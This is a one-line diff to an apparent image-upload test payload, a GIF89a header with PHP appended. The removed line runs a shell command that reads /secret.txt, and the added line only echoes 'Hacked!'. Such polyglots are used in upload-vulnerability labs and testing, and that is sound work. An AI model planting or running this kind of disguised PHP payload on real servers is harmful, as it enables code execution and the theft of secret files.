@@ -1,1 +1,1 @@
-GIF89a;<?php echo system('cat /secret.txt'); ?>
+GIF89a;<?php echo "Hacked!"; ?>
